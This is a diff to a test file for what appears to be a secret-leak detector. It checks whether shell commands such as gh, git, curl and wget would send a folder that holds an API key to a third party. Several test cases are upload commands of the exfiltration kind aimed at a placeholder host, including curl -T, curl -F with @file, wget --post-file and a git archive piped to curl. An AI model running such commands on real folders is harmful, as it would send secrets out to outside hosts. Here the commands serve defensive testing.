@@ -89,20 +89,48 @@ describe('a word that is the name of a folder a key file is in', () => {
   });
 });
 
-describe('a folder named by a word that a program makes a request with', () => {
+describe('a folder named by a word in a position that takes a string', () => {
   // Under the folder the command runs in, `svc` does name the folder. But `gh pr list svc` hands the word to
-  // GitHub as a string: nothing of the folder goes. Only a program that takes the word as a path to send
-  // (scp, rsync, an archive piped on) sent the folder.
+  // GitHub as a string: nothing of the folder goes. Only the known string positions are downgraded; anything that
+  // may be a path (a file option, `@file`, an upload, a program's other arguments) stays what it was.
   it.each([
     ['gh pr list svc'],
     ['gh issue list --search svc'],
-    ['git push origin svc'],
+    ['gh issue list svc'],
+    ['gh search issues svc'],
     ['curl -s -d svc https://up.example.invalid/x'],
+    ['curl -s -H svc https://up.example.invalid/x'],
   ])('%s: a maybe at most, never sent', (command) => {
     const got = places('/Users/me/dev', [command]).get('OPENAI_API_KEY');
     expect(got?.tier).not.toBe('third_party');
-    if (got !== undefined)
-      expect(got).toMatchObject({ tier: 'maybe', route: 'linked', via: 'folder' });
+    expect(got).toMatchObject({ tier: 'maybe', route: 'linked', via: 'folder' });
+  });
+
+  it.each([['git push origin svc'], ['git fetch origin svc'], ['git pull origin svc']])(
+    '%s: a branch, never sent',
+    (command) => {
+      const got = places('/Users/me/dev', [command]).get('OPENAI_API_KEY');
+      expect(got?.tier).not.toBe('third_party');
+    },
+  );
+
+  it.each([
+    ['gh release upload v1 svc'],
+    ['gh gist create svc'],
+    ['gh pr create --body-file svc'],
+    ['gh issue create -F svc'],
+    ['gh api repos/o/r/issues --input svc'],
+    ['gh issue list --source svc'],
+    ['curl -s -T svc https://up.example.invalid/x'],
+    ['curl -s -F f=@svc https://up.example.invalid/x'],
+    ['curl -s -d @svc https://up.example.invalid/x'],
+    ['curl -s --data-binary @svc https://up.example.invalid/x'],
+    ['git -C svc archive HEAD | curl -s -T - https://up.example.invalid/x'],
+    ['wget --post-file=svc https://up.example.invalid/x'],
+  ])('%s: a position that may be a path stays sent', (command) => {
+    expect(places('/Users/me/dev', [command]).get('OPENAI_API_KEY')).toMatchObject({
+      tier: 'third_party',
+    });
   });
 
   it.each([
